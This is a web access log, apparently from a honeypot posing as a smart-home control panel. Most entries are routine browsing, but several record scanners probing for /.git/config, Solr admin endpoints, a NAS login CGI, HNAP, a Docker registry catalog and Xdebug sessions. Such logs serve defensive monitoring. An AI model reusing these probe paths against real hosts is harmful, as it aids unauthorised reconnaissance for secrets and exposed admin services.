+2025-06-29 14:49:55 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:55 +0000] "POST /20.123.44.15:5000 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:55 INFO:snare.server:handle_request: Request path: /20.123.44.15:5000
+2025-06-29 14:49:55 INFO:snare.server:handle_request: POST data:
+2025-06-29 14:49:55 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:55 +0000] "POST /20.123.44.15:5000 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:56 INFO:snare.server:handle_request: Request path: /20.123.44.15:5000
+2025-06-29 14:49:56 INFO:snare.server:handle_request: POST data:
+2025-06-29 14:49:56 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:56 +0000] "POST /20.123.44.15:5000 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:56 INFO:snare.server:handle_request: Request path: /20.123.44.15:5000
+2025-06-29 14:49:56 INFO:snare.server:handle_request: POST data:
+2025-06-29 14:49:56 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:56 +0000] "POST /20.123.44.15:5000 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:57 INFO:snare.server:handle_request: Request path: /20.123.44.15:5000
+2025-06-29 14:49:57 INFO:snare.server:handle_request: POST data:
+2025-06-29 14:49:57 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:57 +0000] "POST /20.123.44.15:5000 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:57 INFO:snare.server:handle_request: Request path: /20.123.44.15:5000
+2025-06-29 14:49:57 INFO:snare.server:handle_request: POST data:
+2025-06-29 14:49:57 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:57 +0000] "POST /20.123.44.15:5000 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:57 INFO:snare.server:handle_request: Request path: /20.123.44.15:5000
+2025-06-29 14:49:57 INFO:snare.server:handle_request: POST data:
+2025-06-29 14:49:57 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:57 +0000] "POST /20.123.44.15:5000 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:57 INFO:snare.server:handle_request: Request path: /20.123.44.15:5000
+2025-06-29 14:49:57 INFO:snare.server:handle_request: POST data:
+2025-06-29 14:49:57 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:57 +0000] "POST /20.123.44.15:5000 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:58 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:49:58 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:58 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:58 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:49:58 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:58 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:58 INFO:snare.server:handle_request: Request path: /assets/images/logo.png
+2025-06-29 14:49:58 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:58 +0000] "GET /assets/images/logo.png HTTP/1.1" 200 427 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:59 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:49:59 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:59 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:49:59 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:49:59 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:49:59 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:52:16 INFO:snare.server:handle_request: Request path: /.git/config
+2025-06-29 14:52:16 INFO:aiohttp.access:log: 196.251.66.177 [29/Jun/2025:14:52:16 +0000] "GET /.git/config HTTP/1.1" 404 433 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+2025-06-29 14:52:40 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:52:40 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:52:40 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:52:40 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:52:40 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:52:40 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:52:40 INFO:snare.server:handle_request: Request path: /assets/images/logo.png
+2025-06-29 14:52:40 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:52:40 +0000] "GET /assets/images/logo.png HTTP/1.1" 200 427 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:52:42 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 14:52:42 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:52:42 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:52:42 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 14:52:42 INFO:aiohttp.access:log: 217.71.1.44 [29/Jun/2025:14:52:42 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-29 14:59:14 INFO:snare.server:handle_request: Request path: /
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 167.71.44.121 [29/Jun/2025:14:59:14 +0000] "GET / HTTP/1.0" 200 2033 "-" "-"
+2025-06-29 14:59:14 INFO:snare.server:handle_request: Request path: /
+2025-06-29 14:59:14 INFO:snare.server:handle_request: Request path: /sdk
+2025-06-29 14:59:14 INFO:snare.server:handle_request: POST data:
+2025-06-29 14:59:14 INFO:snare.server:handle_request: Request path: /odinhttpcall1751209154
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 167.71.44.121 [29/Jun/2025:14:59:14 +0000] "GET / HTTP/1.0" 200 2033 "-" "-"
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 167.71.44.121 [29/Jun/2025:14:59:14 +0000] "GET /odinhttpcall1751209154 HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 167.71.44.121 [29/Jun/2025:14:59:14 +0000] "POST /sdk HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
+2025-06-29 14:59:14 INFO:snare.server:handle_request: Request path: /HNAP1
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 167.71.44.121 [29/Jun/2025:14:59:14 +0000] "GET /HNAP1 HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
+2025-06-29 14:59:14 INFO:snare.server:handle_request: Request path: /evox/about
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 167.71.44.121 [29/Jun/2025:14:59:14 +0000] "GET /evox/about HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
+2025-06-29 14:59:14 INFO:snare.server:handle_request: Request path: /
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 167.71.44.121 [29/Jun/2025:14:59:14 +0000] "GET / HTTP/1.0" 200 2033 "-" "-"
+2025-06-29 14:59:14 INFO:snare.server:handle_request: Request path: /
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 167.71.44.121 [29/Jun/2025:14:59:14 +0000] "GET / HTTP/1.1" 200 2033 "-" "-"
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 159.89.7.165 [29/Jun/2025:14:59:14 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-29 14:59:14 INFO:snare.server:handle_request: Request path: /solr/admin/info/system
+2025-06-29 14:59:14 INFO:snare.server:handle_request: Request path: /query?q=SHOW+DIAGNOSTICS
+2025-06-29 14:59:14 INFO:snare.server:handle_request: Request path: /cgi-bin/authLogin.cgi
+2025-06-29 14:59:14 INFO:snare.server:handle_request: Request path: /
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 159.89.7.165 [29/Jun/2025:14:59:14 +0000] "GET /solr/admin/info/system HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 134.209.248.231 [29/Jun/2025:14:59:14 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 164.90.232.0 [29/Jun/2025:14:59:14 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 46.101.136.75 [29/Jun/2025:14:59:14 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 159.89.7.165 [29/Jun/2025:14:59:14 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-29 14:59:14 INFO:snare.server:handle_request: Request path: /solr/admin/cores?action=STATUS&wt=json
+2025-06-29 14:59:14 INFO:aiohttp.access:log: 159.89.7.165 [29/Jun/2025:14:59:14 +0000] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 14:59:15 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-29 14:59:15 INFO:aiohttp.access:log: 167.71.218.57 [29/Jun/2025:14:59:15 +0000] "GET /favicon.ico HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 14:59:17 INFO:snare.server:handle_request: Request path: /v2/_catalog
+2025-06-29 14:59:17 INFO:aiohttp.access:log: 157.230.122.57 [29/Jun/2025:14:59:17 +0000] "GET /v2/_catalog HTTP/1.1" 404 452 "-" "Go-http-client/1.1"
+2025-06-29 15:00:01 INFO:aiohttp.access:log: 159.89.7.165 [29/Jun/2025:15:00:01 +0000] "UNKNOWN / HTTP/1.0" 400 222 "-" "-"
+2025-06-29 15:05:57 INFO:snare.server:handle_request: Request path: /
+2025-06-29 15:05:57 INFO:aiohttp.access:log: 108.165.153.6 [29/Jun/2025:15:05:57 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 15:06:33 INFO:snare.server:handle_request: Request path: /
+2025-06-29 15:06:33 INFO:aiohttp.access:log: 185.242.226.80 [29/Jun/2025:15:06:33 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
+2025-06-29 15:14:42 INFO:snare.server:handle_request: Request path: /
+2025-06-29 15:14:42 INFO:aiohttp.access:log: 87.121.84.212 [29/Jun/2025:15:14:42 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-29 15:29:05 INFO:snare.server:handle_request: Request path: /portal/redlion
+2025-06-29 15:29:05 INFO:aiohttp.access:log: 20.171.9.56 [29/Jun/2025:15:29:05 +0000] "GET /portal/redlion HTTP/1.1" 404 433 "-" "Mozilla/5.0 zgrab/0.x"
+2025-06-29 15:41:05 INFO:snare.server:handle_request: Request path: /?XDEBUG_SESSION_START=phpstorm
+2025-06-29 15:41:05 INFO:aiohttp.access:log: 79.124.58.198 [29/Jun/2025:15:41:05 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+2025-06-29 15:44:20 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 15:44:20 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:20 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:20 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.woff2
+2025-06-29 15:44:20 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.ttf
+2025-06-29 15:44:20 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:20 +0000] "GET /assets/webfonts/fa-regular-400.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:20 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:20 +0000] "GET /assets/webfonts/fa-regular-400.ttf HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:20 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 15:44:20 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:20 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:25 INFO:snare.server:handle_request: Request path: /apple-touch-icon-precomposed.png
+2025-06-29 15:44:25 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:25 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 433 "-" "com.apple.WebKit.Networking/20621.2.5.11.8 Network/4277.121.5 macOS/15.5"
+2025-06-29 15:44:25 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-29 15:44:25 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:25 +0000] "GET /favicon.ico HTTP/1.1" 404 433 "-" "com.apple.WebKit.Networking/20621.2.5.11.8 Network/4277.121.5 macOS/15.5"
+2025-06-29 15:44:25 INFO:snare.server:handle_request: Request path: /apple-touch-icon.png
+2025-06-29 15:44:25 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:25 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 433 "-" "com.apple.WebKit.Networking/20621.2.5.11.8 Network/4277.121.5 macOS/15.5"
+2025-06-29 15:44:33 INFO:snare.server:handle_request: Request path: /dashboard.html
+2025-06-29 15:44:33 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:33 +0000] "GET /dashboard.html HTTP/1.1" 200 2913 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:33 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 15:44:33 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:33 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:33 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 15:44:33 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:33 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:33 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.woff2
+2025-06-29 15:44:33 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:33 +0000] "GET /assets/webfonts/fa-regular-400.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:33 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.ttf
+2025-06-29 15:44:33 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:33 +0000] "GET /assets/webfonts/fa-regular-400.ttf HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:34 INFO:snare.server:handle_request: Request path: /thermostat.html
+2025-06-29 15:44:34 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:34 +0000] "GET /thermostat.html HTTP/1.1" 200 5101 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:34 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 15:44:34 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:34 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:34 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 15:44:34 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:34 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:35 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.woff2
+2025-06-29 15:44:35 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:35 +0000] "GET /assets/webfonts/fa-regular-400.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:35 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.ttf
+2025-06-29 15:44:35 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:35 +0000] "GET /assets/webfonts/fa-regular-400.ttf HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:36 INFO:snare.server:handle_request: Request path: /20.123.44.15:5000
+2025-06-29 15:44:36 INFO:snare.server:handle_request: POST data:
+2025-06-29 15:44:36 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:36 +0000] "POST /20.123.44.15:5000 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:38 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 15:44:38 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:38 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:38 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 15:44:38 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:38 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:38 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.woff2
+2025-06-29 15:44:38 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:38 +0000] "GET /assets/webfonts/fa-regular-400.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:38 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.ttf
+2025-06-29 15:44:38 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:38 +0000] "GET /assets/webfonts/fa-regular-400.ttf HTTP/1.1" 404 433 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:39 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 15:44:39 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:39 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:39 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 15:44:39 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:39 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:39 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.woff2
+2025-06-29 15:44:39 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:39 +0000] "GET /assets/webfonts/fa-regular-400.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:39 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.ttf
+2025-06-29 15:44:39 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:39 +0000] "GET /assets/webfonts/fa-regular-400.ttf HTTP/1.1" 404 433 "http://20.123.44.15/thermostat.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-29 15:44:43 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-29 15:44:43 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:43 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-29 15:44:43 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-29 15:44:43 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:43 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-29 15:44:43 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-29 15:44:43 INFO:aiohttp.access:log: 80.197.130.221 [29/Jun/2025:15:44:43 +0000] "GET /favicon.ico HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-29 15:44:59 INFO:snare.server:handle_request: Request path: /dashboard.html
